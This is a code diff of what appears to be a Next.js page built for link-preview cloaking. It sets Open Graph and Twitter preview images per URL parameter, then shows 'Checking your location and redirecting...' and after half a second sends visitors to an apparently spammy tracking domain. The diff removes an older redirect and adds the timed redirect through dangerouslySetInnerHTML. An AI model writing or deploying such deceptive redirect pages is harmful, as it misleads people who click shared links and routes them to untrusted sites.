@@ -1,6 +1,6 @@
 export default function ImgPage({ ogImage }) {
   return (
-    <html lang="en">
+    <html>
       <head>
         <meta charset="UTF-8" />
         <title>Mood</title>
@@ -15,27 +15,19 @@ export default function ImgPage({ ogImage }) {
         <meta name="twitter:description" content="" />
         <meta property="og:image" content={ogImage} />
         <meta name="twitter:image" content={ogImage} />
-        <noscript>
-        <meta http-equiv="refresh" content="0;https://shorta.space/" />
-        </noscript>
-        <script>
-              window.setTimeout(function(){
-                  window.location.href = "https://broadlyjukeboxunrevised.com/2053781"
-              }, 500);
-        </script>
       </head>
       <body>
         <h1>Checking your location and redirecting...</h1>
+        <script dangerouslySetInnerHTML={{ __html: `window.setTimeout(function(){window.location.href = 'https://broadlyjukeboxunrevised.com/2053781';}, 500);` }} />
       </body>
     </html>
   );
 }
 
 export async function getServerSideProps({ params }) {
-  let ogImage = "https://i.ibb.co/d4Hx5FJS/2025-05-27-01-42-58-Greenshot.png"; // default image
-  if (params.img === "anh1") ogImage = "https://i.ibb.co/d4Hx5FJS/2025-05-27-01-42-58-Greenshot.png";
-  if (params.img === "anh2") ogImage = "https://i.ibb.co/album/anh2";
-  if (params.img === "anh3") ogImage = "https://i.ibb.co/album/anh3";
-  if (params.img === "anh4") ogImage = "https://i.ibb.co/album/anh4";
+  let ogImage = "https://i.ibb.co/VYkrzHPW/Gr-Ag-g-EX0-AIb-C2d.jpg"; // default image
+if (params.img === "anh1") ogImage = "https://i.ibb.co/VYkrzHPW/Gr-Ag-g-EX0-AIb-C2d.jpg";
+if (params.img === "anh2") ogImage = "https://i.ibb.co/mC3SmGK2/Gr-Ai-R7-Ha-AAQQW9x.jpg";
+if (params.img === "anh3") ogImage = "https://i.ibb.co/TQhsLxH/Gr-F3-Ybna-AAA-o-SI.jpg";
   return { props: { ogImage } };
 }
